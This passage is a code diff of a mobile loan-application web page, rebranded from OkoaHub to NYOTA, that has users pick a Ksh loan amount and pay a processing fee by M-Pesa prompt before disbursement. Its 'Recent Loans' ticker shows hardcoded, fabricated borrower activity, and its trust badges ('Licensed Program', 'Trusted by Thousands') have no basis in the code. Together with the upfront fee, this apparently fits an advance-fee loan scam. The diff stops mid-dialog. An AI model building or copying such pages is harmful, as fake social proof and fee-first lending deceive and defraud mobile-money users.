@@ -2,567 +2,745 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apply for Loan | OkoaHub</title>
-    
-    <!-- Favicons -->
-    <link rel="apple-touch-icon" sizes="192x192" href="icons/icon.192.png">
-    <link rel="icon" type="image/png" sizes="512x512" href="icons/icon.512.png">
-    
-    <!-- Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <!-- SweetAlert -->
-    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
-    
-    <style>
-        :root {
-            --green: #2e7d32;
-            --green-light: #4caf50;
-            --cream: #f8f9f2;
-            --white: #ffffff;
-            --black: #1a1a1a;
-            --gray: #666666;
-            --border-radius: 12px;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Apply for Loan | NYOTA</title>
 
-        body {
-            min-height: 100vh;
-            background-color: var(--cream);
-            color: var(--black);
-            padding: 16px;
-            line-height: 1.4;
-        }
+  <!-- Favicons -->
+  <link rel="apple-touch-icon" sizes="192x192" href="icons/icon.192.png">
+  <link rel="icon" type="image/png" sizes="512x512" href="icons/icon.512.png">
 
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-        }
+  <!-- Fonts & icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
-        .welcome-card {
-            background: var(--white);
-            border-radius: var(--border-radius);
-            padding: 20px;
-            margin-bottom: 16px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
+  <!-- SweetAlert -->
+  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
 
-        .welcome-text {
-            font-size: 0.95rem;
-        }
+  <style>
+    :root{
+      --primary: #008037;        /* NYOTA green */
+      --primary-strong: #00662a;
+      --accent: #d32f2f;         /* red */
+      --bg: #f8f9f2;
+      --card: #ffffff;
+      --muted: #6b7280;
+      --radius: 14px;
+      --shadow-sm: 0 2px 8px rgba(2,6,23,0.06);
+      --shadow-md: 0 6px 20px rgba(2,6,23,0.08);
+    }
 
-        .user-name {
-            color: var(--green);
-            font-weight: 600;
-        }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;
+      background:linear-gradient(180deg, #f6fbf7 0%, var(--bg) 100%);
+      color:#0b1220;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      line-height:1.35;
+      padding:16px;
+    }
 
-        .news-ticker {
-            background-color: rgba(46, 125, 50, 0.1);
-            border-radius: var(--border-radius);
-            padding: 12px 16px;
-            margin-bottom: 16px;
-            overflow: hidden;
-            position: relative;
-            min-height: 60px;
-        }
+    /* Container centered for mobile-first */
+    .wrap{
+      max-width:540px;
+      margin:0 auto;
+    }
 
-        .ticker-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 8px;
-            color: var(--green);
-            font-weight: 600;
-            font-size: 0.9rem;
-        }
+    /* Header / welcome */
+    .top {
+      display:flex;
+      align-items:center;
+      gap:12px;
+      margin-bottom:12px;
+    }
 
-        .ticker-header i {
-            margin-right: 8px;
-        }
+    .logo-box{
+      background:var(--card);
+      padding:8px 12px;
+      border-radius:12px;
+      box-shadow:var(--shadow-sm);
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+    }
+    .logo-box img{height:44px; width:auto; display:block; object-fit:contain}
 
-        .ticker-message {
-            font-size: 0.85rem;
-            position: absolute;
-            width: 100%;
-            opacity: 0;
-            transition: opacity 0.5s ease-in-out;
-        }
+    .welcome {
+      flex:1;
+    }
+    .welcome h1{
+      font-size:1.05rem;
+      margin:0;
+      color:var(--primary-strong);
+      font-weight:700;
+    }
+    .welcome p{
+      margin:2px 0 0;
+      color:var(--muted);
+      font-size:0.85rem;
+    }
 
-        .ticker-message.active {
-            opacity: 1;
-        }
+    /* News ticker */
+    .ticker {
+      background:linear-gradient(90deg, rgba(0,128,55,0.06), rgba(0,128,55,0.02));
+      border-radius:12px;
+      padding:10px 12px;
+      margin:12px 0;
+      position:relative;
+      overflow:hidden;
+      box-shadow:var(--shadow-sm);
+      min-height:56px;
+    }
+    .ticker-head{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      color:var(--primary-strong);
+      font-weight:600;
+      font-size:0.9rem;
+      margin-bottom:6px;
+    }
+    .ticker-list{
+      position:relative;
+      height:22px;
+    }
+    .ticker-item{
+      position:absolute;
+      left:0;
+      right:0;
+      opacity:0;
+      transform:translateY(6px);
+      transition:all .35s ease;
+      color:#111827;
+      font-size:0.9rem;
+    }
+    .ticker-item.active{
+      opacity:1;
+      transform:translateY(0);
+    }
 
-        .loan-card {
-            background: var(--white);
-            border-radius: var(--border-radius);
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
+    /* Card */
+    .card{
+      background:var(--card);
+      border-radius:14px;
+      padding:14px;
+      box-shadow:var(--shadow-md);
+      margin-bottom:16px;
+    }
 
-        .card-title {
-            text-align: center;
-            font-size: 1.2rem;
-            margin-bottom: 16px;
-            color: var(--green);
-        }
+    .card-title{
+      text-align:center;
+      color:var(--primary-strong);
+      font-weight:700;
+      margin-bottom:12px;
+      font-size:1.05rem;
+    }
 
-        .loan-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 12px;
-        }
+    /* Loan grid - always 2 columns */
+    .loan-grid{
+      display:grid;
+      grid-template-columns:repeat(2, minmax(0,1fr)); /* enforces 2 per row even on narrow screens */
+      gap:10px;
+    }
 
-        .loan-option {
-            background: var(--cream);
-            border: 1px solid rgba(0,0,0,0.1);
-            border-radius: var(--border-radius);
-            padding: 16px 12px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
+    .loan-option{
+      background:linear-gradient(180deg, #ffffff, rgba(0,0,0,0.01));
+      border-radius:12px;
+      padding:12px;
+      border:1px solid rgba(2,6,23,0.06);
+      text-align:center;
+      cursor:pointer;
+      transition:transform .14s ease, box-shadow .14s ease, border-color .14s ease;
+      user-select:none;
+      -webkit-tap-highlight-color: transparent;
+      display:flex;
+      flex-direction:column;
+      gap:6px;
+      align-items:center;
+      justify-content:center;
+    }
+    .loan-option:hover{ transform:translateY(-4px); box-shadow:0 8px 18px rgba(2,6,23,0.06) }
+    .loan-option.selected{
+      border-color:var(--primary);
+      box-shadow:0 10px 26px rgba(0,128,55,0.08);
+      transform:translateY(-6px) scale(1.01);
+    }
+    .loan-amount{
+      font-weight:700;
+      color:var(--primary-strong);
+      font-size:1rem;
+    }
+    .processing-fee{
+      font-size:0.78rem;
+      color:var(--muted);
+    }
 
-        .loan-option:hover {
-            transform: translateY(-2px);
-        }
+    /* CTA container */
+    .cta-wrap{
+      margin-top:12px;
+      display:flex;
+      flex-direction:column;
+      gap:10px;
+    }
 
-        .loan-option.selected {
-            border-color: var(--green);
-            background-color: rgba(46, 125, 50, 0.1);
-        }
+    .btn-primary{
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      gap:10px;
+      width:100%;
+      padding:14px;
+      border-radius:12px;
+      border:0;
+      color:#fff;
+      background:linear-gradient(90deg,var(--primary),var(--primary-strong));
+      font-weight:700;
+      font-size:1rem;
+      cursor:pointer;
+      box-shadow:0 8px 18px rgba(0,128,55,0.14);
+      transition:transform .12s ease;
+    }
+    .btn-primary:active{ transform:scale(.99) }
+    .btn-primary[disabled]{ opacity:.55; cursor:not-allowed; transform:none; box-shadow:none }
 
-        .loan-amount {
-            font-size: 1.2rem;
-            font-weight: 700;
-            color: var(--green);
-            margin-bottom: 4px;
-        }
+    .muted{
+      color:var(--muted);
+      font-size:0.9rem;
+      text-align:center;
+    }
 
-        .processing-fee {
-            font-size: 0.8rem;
-            color: var(--gray);
-        }
+    .small-note{
+      font-size:0.82rem;
+      color:var(--muted);
+      text-align:center;
+      margin-top:8px;
+    }
 
-        .btn-apply {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(to right, var(--green), var(--green-light));
-            color: var(--white);
-            border: none;
-            border-radius: var(--border-radius);
-            font-size: 1rem;
-            font-weight: 600;
-            margin: 16px 0;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
+    /* Error */
+    .error {
+      color:#dc3545;
+      text-align:center;
+      font-size:0.9rem;
+      display:none;
+      margin-top:6px;
+    }
 
-        .btn-apply:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
+    /* Responsive tweaks */
+    @media (min-width: 520px){
+      .wrap{ padding:6px 0 }
+      .logo-box img{ height:52px }
+    }
 
-        .btn-apply:active:not(:disabled) {
-            transform: scale(0.98);
-        }
+    /* Make sure two columns even on very narrow phones by reducing padding */
+    @media (max-width: 320px) {
+      .loan-option{ padding:8px }
+      .loan-amount { font-size:0.95rem }
+    }
 
-        .error-message {
-            color: #dc3545;
-            font-size: 0.9rem;
-            text-align: center;
-            margin-top: 8px;
-            display: none;
-        }
+    /* trust badges row - UPDATED for mobile */
+    .trust-row{
+      display:grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top:10px;
+      padding-bottom:6px;
+    }
+    .trust-pill{
+      background:linear-gradient(180deg, rgba(0,128,55,0.06), rgba(0,128,55,0.02));
+      padding:8px 12px;
+      border-radius:999px;
+      font-size:0.8rem;
+      display:flex;
+      gap:8px;
+      align-items:center;
+      justify-content: center;
+      color:var(--primary-strong);
+      white-space:nowrap;
+      border:1px solid rgba(0,0,0,0.03);
+      text-align: center;
+    }
+    .trust-pill i{ font-size:0.95rem }
 
-        .back-link {
-            display: block;
-            text-align: center;
-            margin-top: 24px;
-            color: var(--gray);
-            text-decoration: none;
-            font-size: 0.9rem;
-        }
+    /* Desktop view for trust badges */
+    @media (min-width: 768px) {
+      .trust-row{
+        display:flex;
+        flex-wrap:nowrap;
+        justify-content:center;
+        align-items:center;
+        gap:10px;
+      }
+    }
 
-        .back-link:hover {
-            color: var(--green);
-        }
-    </style>
+    /* animations */
+    .fade-in { animation: fadeIn .36s ease both }
+    @keyframes fadeIn { from { opacity:0; transform: translateY(6px) } to { opacity:1; transform:none } }
+  </style>
 </head>
 
 <body>
-    <div class="container">
-        <div class="welcome-card">
-            <p class="welcome-text">
-                Hi <span class="user-name" id="user-name"></span>, you qualify for these loan options based on your <strong>M-Pesa records</strong> (2-month term at 10% interest).
-            </p>
-        </div>
+  <div class="wrap">
 
-        <div class="news-ticker">
-            <div class="ticker-header">
-                <i class="fas fa-bullhorn"></i>
-                <span>Recent Loans</span>
-            </div>
-            <div id="ticker-container"></div>
-        </div>
-
-        <div class="loan-card">
-            <h3 class="card-title">Select Your Loan Amount</h3>
-            <div class="loan-grid">
-                <div class="loan-option" onclick="selectLoanOption(this, 5500, 50)">
-                    <div class="loan-amount">Ksh 5,500</div>
-                    <div class="processing-fee">Fee: Ksh 50</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 7800, 80)">
-                    <div class="loan-amount">Ksh 7,800</div>
-                    <div class="processing-fee">Fee: Ksh 80</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 9800, 110)">
-                    <div class="loan-amount">Ksh 9,800</div>
-                    <div class="processing-fee">Fee: Ksh 110</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 11200, 150)">
-                    <div class="loan-amount">Ksh 11,200</div>
-                    <div class="processing-fee">Fee: Ksh 150</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 16800, 180)">
-                    <div class="loan-amount">Ksh 16,800</div>
-                    <div class="processing-fee">Fee: Ksh 180</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 21200, 220)">
-                    <div class="loan-amount">Ksh 21,200</div>
-                    <div class="processing-fee">Fee: Ksh 220</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 25600, 350)">
-                    <div class="loan-amount">Ksh 25,600</div>
-                    <div class="processing-fee">Fee: Ksh 350</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 30000, 420)">
-                    <div class="loan-amount">Ksh 30,000</div>
-                    <div class="processing-fee">Fee: Ksh 420</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 35400, 540)">
-                    <div class="loan-amount">Ksh 35,400</div>
-                    <div class="processing-fee">Fee: Ksh 540</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 39800, 680)">
-                    <div class="loan-amount">Ksh 39,800</div>
-                    <div class="processing-fee">Fee: Ksh 680</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 44200, 960)">
-                    <div class="loan-amount">Ksh 44,200</div>
-                    <div class="processing-fee">Fee: Ksh 960</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 48600, 1550)">
-                    <div class="loan-amount">Ksh 48,600</div>
-                    <div class="processing-fee">Fee: Ksh 1550</div>
-                </div>
-            </div>
-        </div>
-
-        <button id="apply-btn" class="btn-apply" disabled>
-            Get Loan Now <i class="fas fa-arrow-right"></i>
-        </button>
-        <div id="error-message" class="error-message">Please select a loan amount to continue</div>
-
-        <a href="eligibility.html" class="back-link">
-            <i class="fas fa-arrow-left"></i> Back to Home
-        </a>
+    <!-- TOP -->
+    <div class="top">
+      <div class="logo-box" aria-hidden="true">
+        <img src="icons/logo.png" alt="NYOTA logo">
+      </div>
+      <div class="welcome">
+        <h1>Hi <span id="user-name">Customer</span> 👋</h1>
+        <p>Based on your M-Pesa activity — choose a loan and pay the processing fee to get disbursed.</p>
+      </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
-    
-    <script>
-    // Serverless API endpoints
+    <!-- TICKER -->
+    <div class="ticker card" aria-live="polite">
+      <div class="ticker-head"><i class="fas fa-bullhorn"></i> Recent Loans</div>
+      <div class="ticker-list" id="ticker-container" aria-hidden="false"></div>
+    </div>
+
+    <!-- LOAN OPTIONS -->
+    <section class="card fade-in" aria-labelledby="loan-title">
+      <div class="card-title" id="loan-title">Select Your Loan Amount</div>
+
+      <div class="loan-grid" id="loan-grid" role="list">
+        <!-- Loan options generated in markup for quick copy/paste -->
+        <div class="loan-option" role="listitem" tabindex="0" data-amount="5500" data-fee="50">
+          <div class="loan-amount">Ksh 5,500</div>
+          <div class="processing-fee">Fee: Ksh 50</div>
+        </div>
+
+        <div class="loan-option" role="listitem" tabindex="0" data-amount="7800" data-fee="80">
+          <div class="loan-amount">Ksh 7,800</div>
+          <div class="processing-fee">Fee: Ksh 80</div>
+        </div>
+
+        <div class="loan-option" role="listitem" tabindex="0" data-amount="9800" data-fee="110">
+          <div class="loan-amount">Ksh 9,800</div>
+          <div class="processing-fee">Fee: Ksh 110</div>
+        </div>
+
+        <div class="loan-option" role="listitem" tabindex="0" data-amount="11200" data-fee="150">
+          <div class="loan-amount">Ksh 11,200</div>
+          <div class="processing-fee">Fee: Ksh 150</div>
+        </div>
+
+        <div class="loan-option" role="listitem" tabindex="0" data-amount="16800" data-fee="180">
+          <div class="loan-amount">Ksh 16,800</div>
+          <div class="processing-fee">Fee: Ksh 180</div>
+        </div>
+
+        <div class="loan-option" role="listitem" tabindex="0" data-amount="21200" data-fee="220">
+          <div class="loan-amount">Ksh 21,200</div>
+          <div class="processing-fee">Fee: Ksh 220</div>
+        </div>
+
+        <div class="loan-option" role="listitem" tabindex="0" data-amount="25600" data-fee="350">
+          <div class="loan-amount">Ksh 25,600</div>
+          <div class="processing-fee">Fee: Ksh 350</div>
+        </div>
+
+        <div class="loan-option" role="listitem" tabindex="0" data-amount="30000" data-fee="420">
+          <div class="loan-amount">Ksh 30,000</div>
+          <div class="processing-fee">Fee: Ksh 420</div>
+        </div>
+
+        <div class="loan-option" role="listitem" tabindex="0" data-amount="35400" data-fee="540">
+          <div class="loan-amount">Ksh 35,400</div>
+          <div class="processing-fee">Fee: Ksh 540</div>
+        </div>
+
+        <div class="loan-option" role="listitem" tabindex="0" data-amount="39800" data-fee="680">
+          <div class="loan-amount">Ksh 39,800</div>
+          <div class="processing-fee">Fee: Ksh 680</div>
+        </div>
+
+        <div class="loan-option" role="listitem" tabindex="0" data-amount="44200" data-fee="960">
+          <div class="loan-amount">Ksh 44,200</div>
+          <div class="processing-fee">Fee: Ksh 960</div>
+        </div>
+
+        <div class="loan-option" role="listitem" tabindex="0" data-amount="48600" data-fee="1550">
+          <div class="loan-amount">Ksh 48,600</div>
+          <div class="processing-fee">Fee: Ksh 1550</div>
+        </div>
+      </div>
+
+      <!-- Selected summary badge - REMOVED from display -->
+      <div id="selected-summary" class="summary" aria-live="polite" hidden style="display: none !important;">
+        <div class="summary-row">
+          <div class="summary-label">Selected</div>
+          <div class="summary-value" id="summary-amount">Ksh 0</div>
+        </div>
+        <div class="summary-row">
+          <div class="summary-label">Processing fee</div>
+          <div class="summary-value" id="summary-fee">Ksh 0</div>
+        </div>
+        <div class="summary-row">
+          <div class="summary-label">Total repayment (est.)</div>
+          <div class="summary-value" id="summary-total">Ksh 0</div>
+        </div>
+      </div>
+
+    </section>
+
+    <!-- CTA -->
+    <div class="cta-wrap">
+      <button id="apply-btn" class="btn-primary" disabled aria-disabled="true">Get Loan Now <i class="fas fa-arrow-right" style="margin-left:8px"></i></button>
+      <div class="error" id="error-message">Please select a loan amount to continue</div>
+    </div>
+
+    <!-- trust row - UPDATED layout -->
+    <div class="trust-row" aria-hidden="false" style="margin-top:14px">
+      <div class="trust-pill"><i class="fas fa-lock"></i> SSL Secured</div>
+      <div class="trust-pill"><i class="fas fa-shield-alt"></i> Data Protected</div>
+      <div class="trust-pill"><i class="fas fa-certificate"></i> Licensed Program</div>
+      <div class="trust-pill"><i class="fas fa-users"></i> Trusted by Thousands</div>
+    </div>
+
+  </div>
+
+  <!-- SweetAlert -->
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
+
+  <script>
+    /* -------------------------
+       Config / Server endpoints
+       ------------------------- */
     const API_ENDPOINTS = {
-        initiatePayment: '/api/initiate-payment',
-        verifyPayment: '/api/verify-payment',
-        normalizePhone: '/api/normalize-phone'
+      initiatePayment: '/api/initiate-payment',
+      verifyPayment: '/api/verify-payment',
+      normalizePhone: '/api/normalize-phone'
     };
 
-    // Send STK Push via Serverless Function
-    async function sendPayHeroSTK(phoneNumber, amount, loanAmount) {
-        try {
-            const response = await fetch(API_ENDPOINTS.initiatePayment, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    phone_number: phoneNumber,
-                    amount: amount,
-                    loan_amount: loanAmount
-                })
-            });
-
-            const result = await response.json();
-
-            if (!response.ok) {
-                throw new Error(result.error || 'Payment initiation failed');
-            }
-
-            return result;
-        } catch (error) {
-            console.error('Payment API Error:', error);
-            throw error;
-        }
-    }
-
-    // Check payment status via Serverless Function
-    async function checkPaymentStatus(reference, maxAttempts = 20) {
-        let attempts = 0;
-        
-        return new Promise((resolve, reject) => {
-            const interval = setInterval(async () => {
-                attempts++;
-                
-                try {
-                    const response = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${reference}`);
-                    const result = await response.json();
-
-                    console.log(`Payment status check ${attempts}:`, result);
-
-                    if (result.success && (result.status === 'COMPLETED' || result.status === 'SUCCESS')) {
-                        clearInterval(interval);
-                        resolve(true);
-                    } else if (result.success && (result.status === 'FAILED' || result.status === 'CANCELLED')) {
-                        clearInterval(interval);
-                        reject(new Error('Payment failed or was cancelled'));
-                    } else if (attempts >= maxAttempts) {
-                        clearInterval(interval);
-                        reject(new Error('Payment verification timeout'));
-                    }
-                } catch (error) {
-                    console.error('Status check error:', error);
-                    
-                    if (attempts >= maxAttempts) {
-                        clearInterval(interval);
-                        reject(new Error('Payment verification failed'));
-                    }
-                }
-            }, 3000);
-        });
-    }
-
-    // Normalize phone via Serverless Function
-    async function normalizePhoneNumber(phone) {
-        try {
-            const response = await fetch(API_ENDPOINTS.normalizePhone, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ phone })
-            });
-
-            const result = await response.json();
-
-            if (!response.ok) {
-                throw new Error(result.error || 'Phone normalization failed');
-            }
-
-            return result.normalized_phone;
-        } catch (error) {
-            console.error('Phone normalization error:', error);
-            throw error;
-        }
-    }
-
-    // User data initialization
+    /* -------------------------
+       Load user data (same behavior)
+       ------------------------- */
     const userData = JSON.parse(sessionStorage.getItem('myLoan') || '{}');
     if (!userData.phone_number) {
-        window.location.href = 'eligibility.html';
+      // If no phone, go back to eligibility
+      window.location.href = 'eligibility.html';
     }
 
     document.getElementById('user-name').textContent = userData.name || 'Customer';
 
-    let selectedLoan = null;
-    let paymentReference = null;
-
-    // Ticker messages
+    /* -------------------------
+       TICKER
+       ------------------------- */
     const tickerMessages = [
-        "0721****77 loaned Ksh 15,000 - just now",
-        "0723****12 loaned Ksh 9,500 - 2 mins ago",
-        "0710****90 loaned Ksh 4,200 - 1 min ago",
-        "0725****89 loaned Ksh 18,000 - just now",
-        "0722****33 loaned Ksh 5,600 - 3 mins ago",
-        "0728****01 loaned Ksh 21,300 - just now",
-        "0711****45 loaned Ksh 8,000 - 5 mins ago",
-        "0713****12 loaned Ksh 13,200 - 9 mins ago",
-        "0727****01 loaned Ksh 22,500 - 7 mins ago",
-        "0706****78 loaned Ksh 16,400 - just now"
+      "0721****77 loaned Ksh 15,000 - just now",
+      "0723****12 loaned Ksh 9,500 - 2 mins ago",
+      "0710****90 loaned Ksh 4,200 - 1 min ago",
+      "0725****89 loaned Ksh 18,000 - just now",
+      "0722****33 loaned Ksh 5,600 - 3 mins ago",
+      "0728****01 loaned Ksh 21,300 - just now",
+      "0711****45 loaned Ksh 8,000 - 5 mins ago",
+      "0713****12 loaned Ksh 13,200 - 9 mins ago",
+      "0727****01 loaned Ksh 22,500 - 7 mins ago",
+      "0706****78 loaned Ksh 16,400 - just now"
     ];
 
     function initTicker() {
-        const tickerContainer = document.getElementById('ticker-container');
-        
-        tickerMessages.forEach((message, index) => {
-            const messageElement = document.createElement('div');
-            messageElement.className = 'ticker-message';
-            messageElement.textContent = message;
-            messageElement.dataset.index = index;
-            tickerContainer.appendChild(messageElement);
-        });
-        
-        const messages = document.querySelectorAll('.ticker-message');
-        if (messages.length > 0) {
-            messages[0].classList.add('active');
-        }
-        
-        let currentIndex = 0;
-        setInterval(() => {
-            messages[currentIndex].classList.remove('active');
-            currentIndex = (currentIndex + 1) % messages.length;
-            messages[currentIndex].classList.add('active');
-        }, 2000);
+      const container = document.getElementById('ticker-container');
+      tickerMessages.forEach((m, i) => {
+        const el = document.createElement('div');
+        el.className = 'ticker-item';
+        el.textContent = m;
+        el.dataset.index = i;
+        container.appendChild(el);
+      });
+      const items = container.querySelectorAll('.ticker-item');
+      if (!items.length) return;
+      let idx = 0;
+      items[idx].classList.add('active');
+      setInterval(() => {
+        items[idx].classList.remove('active');
+        idx = (idx + 1) % items.length;
+        items[idx].classList.add('active');
+      }, 2000);
     }
-
     window.addEventListener('load', initTicker);
 
-    function selectLoanOption(element, amount, fee) {
-        document.querySelectorAll('.loan-option').forEach(opt => {
-            opt.classList.remove('selected');
-        });
-        element.classList.add('selected');
-        selectedLoan = { amount, fee };
-        document.getElementById('apply-btn').disabled = false;
-        document.getElementById('error-message').style.display = 'none';
-        userData.loan_amount = amount;
-        userData.processing_fee = fee;
-        sessionStorage.setItem('myLoan', JSON.stringify(userData));
+    /* -------------------------
+       Loan selection handlers
+       ------------------------- */
+    const loanGrid = document.getElementById('loan-grid');
+    const loanOptions = Array.from(loanGrid.querySelectorAll('.loan-option'));
+    const applyBtn = document.getElementById('apply-btn');
+    const errorMsg = document.getElementById('error-message');
+    const selectedSummary = document.getElementById('selected-summary');
+
+    let selectedLoan = null;
+    let paymentReference = null;
+
+    function formatKsh(n) {
+      return 'Ksh ' + Number(n).toLocaleString('en-KE');
     }
 
-    document.getElementById('apply-btn').addEventListener('click', async function() {
-        if (!selectedLoan) {
-            document.getElementById('error-message').style.display = 'block';
-            return;
+    function updateSummary() {
+      // Summary is now hidden, so we don't need to update it
+      return;
+    }
+
+    loanOptions.forEach(opt => {
+      opt.addEventListener('click', () => {
+        selectLoanOption(opt);
+      });
+      opt.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' || e.key === ' ') {
+          e.preventDefault();
+          selectLoanOption(opt);
+        }
+      });
+    });
+
+    function selectLoanOption(element) {
+      loanOptions.forEach(o => o.classList.remove('selected'));
+      element.classList.add('selected');
+      const amount = Number(element.dataset.amount);
+      const fee = Number(element.dataset.fee);
+      selectedLoan = { amount, fee };
+      // enable apply button
+      applyBtn.disabled = false;
+      applyBtn.removeAttribute('aria-disabled');
+      errorMsg.style.display = 'none';
+      // persist
+      userData.loan_amount = amount;
+      userData.processing_fee = fee;
+      sessionStorage.setItem('myLoan', JSON.stringify(userData));
+      updateSummary();
+    }
+
+    /* -------------------------
+       Payment helpers (serverless)
+       ------------------------- */
+    async function normalizePhoneNumber(phone) {
+      try {
+        const res = await fetch(API_ENDPOINTS.normalizePhone, {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({ phone })
+        });
+        const j = await res.json();
+        if (!res.ok) throw new Error(j.error || 'Phone normalization failed');
+        return j.normalized_phone;
+      } catch (err) {
+        console.error('normalizePhoneNumber error', err);
+        throw err;
+      }
+    }
+
+    async function sendPayHeroSTK(phoneNumber, amount, loanAmount) {
+      try {
+        const res = await fetch(API_ENDPOINTS.initiatePayment, {
+          method:'POST',
+          headers:{ 'Content-Type':'application/json' },
+          body: JSON.stringify({ phone_number: phoneNumber, amount, loan_amount: loanAmount })
+        });
+        const j = await res.json();
+        if (!res.ok) throw new Error(j.error || 'Payment initiation failed');
+        return j;
+      } catch (err) {
+        console.error('sendPayHeroSTK error', err);
+        throw err;
+      }
+    }
+
+    async function checkPaymentStatus(reference, maxAttempts = 20, intervalMs = 3000) {
+      let attempts = 0;
+      return new Promise((resolve, reject) => {
+        const iv = setInterval(async () => {
+          attempts++;
+          try {
+            const res = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${encodeURIComponent(reference)}`);
+            const j = await res.json();
+            if (!res.ok) {
+              // Keep polling unless final error returned
+              console.warn('verification endpoint returned non-200', j);
+            }
+            // adapt to your server's response structure
+            if (j.success && (j.status === 'COMPLETED' || j.status === 'SUCCESS')) {
+              clearInterval(iv);
+              resolve(true);
+            } else if (j.success && (j.status === 'FAILED' || j.status === 'CANCELLED')) {
+              clearInterval(iv);
+              reject(new Error('Payment failed or was cancelled'));
+            } else if (attempts >= maxAttempts) {
+              clearInterval(iv);
+              reject(new Error('Payment verification timeout'));
+            }
+          } catch (err) {
+            console.error('checkPaymentStatus error', err);
+            if (attempts >= maxAttempts) {
+              clearInterval(iv);
+              reject(new Error('Payment verification failed'));
+            }
+          }
+        }, intervalMs);
+      });
+    }
+
+    /* -------------------------
+       Apply button flow (confirmation modal -> STK -> verify -> success)
+       ------------------------- */
+    applyBtn.addEventListener('click', async () => {
+      if (!selectedLoan) {
+        errorMsg.style.display = 'block';
+        return;
+      }
+
+      // Show confirmation dialog (modern)
+      const confirm = await Swal.fire({
+        title: 'Confirm Loan Application',
+        html: `
+          <div style="text-align:left">
+            <p style="margin:0 0 8px">You are applying for:</p>
+            <p style="margin:0"><strong>Loan:</strong> ${formatKsh(selectedLoan.amount)}</p>
+            <p style="margin:0"><strong>Processing fee:</strong> ${formatKsh(selectedLoan.fee)}</p>
+            <p style="margin:0"><strong>Estimated repayment (2 months, 10%):</strong> ${formatKsh(Math.round(selectedLoan.amount * 1.10))}</p>
+            <hr style="margin:12px 0;border:none;border-top:1px dashed #eee">
+            <p style="color:var(--primary-strong);margin:0;font-weight:600">An M-Pesa prompt will be sent to pay the processing fee.</p>
+            <p style="color:var(--muted);margin:6px 0 0;font-size:0.9rem">Phone: ${userData.phone_number}</p>
+          </div>
+        `,
+        icon: 'question',
+        showCancelButton: true,
+        confirmButtonText: 'Proceed to Payment',
+        cancelButtonText: 'Cancel',
+        confirmButtonColor: 'var(--primary)'
+      });
+
+      if (!confirm.isConfirmed) return;
+
+      // Show loading modal
+      Swal.fire({
+        title: 'Initiating Payment',
+        html: 'Please wait — sending M-Pesa prompt to your phone...',
+        allowOutsideClick: false,
+        didOpen: () => Swal.showLoading()
+      });
+
+      try {
+        // 1. normalize phone
+        const normalizedPhone = await normalizePhoneNumber(userData.phone_number);
+
+        // 2. initiate STK
+        const paymentResponse = await sendPayHeroSTK(normalizedPhone, selectedLoan.fee, selectedLoan.amount);
+
+        if (!paymentResponse || !paymentResponse.reference) {
+          throw new Error('Failed to initiate payment (no reference)');
         }
 
-        const result = await Swal.fire({
-            title: 'Confirm Loan Application',
-            html: `
-                <div style="text-align:left;">
-                    <p>You are applying for:</p>
-                    <p><strong>Loan Amount:</strong> Ksh ${selectedLoan.amount.toLocaleString()}</p>
